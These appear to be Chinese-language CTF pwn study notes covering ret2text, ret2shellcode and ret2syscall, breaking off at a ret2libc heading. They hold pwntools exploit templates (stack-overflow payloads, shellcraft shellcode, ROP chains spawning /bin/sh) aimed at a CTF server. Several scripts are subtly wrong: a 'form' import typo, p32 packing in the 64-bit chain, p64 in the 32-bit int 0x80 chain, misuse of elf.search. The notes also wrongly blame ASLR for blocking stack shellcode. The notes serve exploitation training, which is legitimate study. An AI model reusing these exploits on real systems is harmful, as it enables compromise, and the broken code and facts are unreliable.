# ret2text

大多数pwn题的ELF都是动态链接的

```c
#include<stdio.h>
int main(){
	char str[8];
  gets(str);	//由于gets函数缺陷，可以输入超出缓冲区的数据大小，进而覆盖掉返回地址
  return 0;
}
```

gets() 函数的缺陷：

​	它不提供对缓冲区大小的检查，因此容易导致缓冲区溢出，这是一种常见的安全漏洞。攻击者可以利用这种漏洞来执行恶意代码或破坏程序的行为。gets() 函数不会在读取到换行符之前停止读取，这可能导致它读取超出目标缓冲区大小的数据，造成缓冲区溢出。

read() 函数的缺陷：

​	read() 函数通常用于低级I/O操作，它不会对输入数据进行解释或处理，因此可能导致缓冲区溢出或其他安全问题。就像 gets() 一样，如果使用不当，read() 也可能导致缓冲区溢出。read() 函数需要手动指定要读取的字节数，如果不小心指定了一个超过目标缓冲区大小的字节数，也可能导致缓冲区溢出。

## 简单栈溢出编写

```python
from pwn form *
#p = process('./pwn')
p = remote('node.buuoj.cn',8888)
payload = b'A'*8 + p64(0x12345678)
p.sendline(payload)
p.interactive()
```

# ret2shellcode

在 pwntools 中，shellcraft 模块用于生成各种类型的 shellcode，例如反弹 shell、执行系统调用等。shellcraft.sh 脚本通常是 pwntools 的一部分，用于生成 shellcode 的脚本，它包含了一系列的 shellcode 模板，可以根据需要生成对应的 shellcode，并且可以方便地嵌入到漏洞利用脚本中。

## shellcraft模块生成

<img src="../image/image-20240428153225871.png" alt="image-20240428153225871" style="zoom:67%;" />

```python
shellcraft.sh()	#默认生成的shellcode是32位的
shellcraft.amd64.sh()	#生成64位的
p.sendline(asm(shellcraft.sh()))	#把shellcode转成机器码

shellcode = asm(shellcraft.sh())
shellcode = shellcode.ljust(120,b'a')
```

一般来说，靶机基本都开启了ALSR，所以不会对栈写入shellcode，

# ret2syscall

## 第一种情况

当存在system函数，但是没有要执行的命令，刚好存在字符串"/bin/sh"的地址

32位

```python
from pwn form *
context(os='linux',arch='i386',log_level='debug')
#p = process('./pwn')
p = remote('node.buuoj.cn',8888)
system_addr = 0x12345678
bin_sh = 0x12345678
payload = b'A'*8 + p32(system_addr) + p32(0) + p32(bin_sh)	#中间需要加一个p32(任意地址)，32位调用完函数之后，后面都要跟一个返回地址，要符合函数调用约定
p.sendline(payload)
p.interactive()
```

64位

由于64传递参数，会先用6个寄存器传参，往后才使用栈传递参数，所以需要用简单的ROP来构造"/bin/sh"

```python
#使用ROPgadget来获取pop rdi + ret 的地址
ROPgadget --binary pwn --only "pop|rdi|ret"

from pwn form *
context(os='linux',arch='i386',log_level='debug')
#p = process('./pwn')
p = remote('node.buuoj.cn',8888)
system_addr = 0x12345678
bin_sh = 0x12345678
pop_rdi = 0x12345678
payload = b'A'*8 + p32(pop_rdi) + p32(bin_sh) + p32(system_addr)
p.sendline(payload)
p.interactive()
```

## 第二种情况

前置知识

当没有system函数，也没有"/bin/sh"，我们就需要自己使用ROPgadget构造一个后面函数

所以操作系统的内核函数，想要调用需要通过寄存器传入代号，当要执行int 0x80的这个汇编代码时，我们要确保，寄存器已经传入了对应的参数

sys_execve()

> eax=0xb	ebx=0x8048xxx	ecx=0	edx=0

sys_

```shell
#安装ROPgadget
python -m pip install ROPgadget
#在程序的.text段中寻找，可以组成payload的函数
ROPgadget --binary pwn --only "pop|ret"
```

前提是可以使用栈溢出，且可执行文件中没有后门函数，payload在栈中的结构如下

|          int 0x80           |
| :-------------------------: |
|           /bin/sh           |
|              0              |
|              0              |
| pop edx,pop ecx,pop ebx,ret |
|             0xb             |
|         pop eax,ret         |

exp编写

```python
from pwn import *
elf = ELF('./pwn')
sh_addr = hex(elf.search(b'/bin/sh'))	#在ELF中查找'/bin/sh'的字符串地址

#p = remote('node.buuoj.cn',8888)
p = process('./pwn')

pop_eax = 0x12345678
pop_edx_ecx_ebx = 0x12345678
int_80 = 0x12345678
#bin_sh = 0x12345678 当ELF中存在，可直接调用
payload = b'A'*0x60 + p64(pop_eax) + p64(0xb) + p64(pop_edx_ecx_ebx) + p64(0) + p64(0) + p64(sh_addr) + p64(int_80)
p.sendline(payload)
p.interactive()
```

# ret2libc

前置知识，了解ELF执行后，第一次调用函数，会实现一个延迟绑定

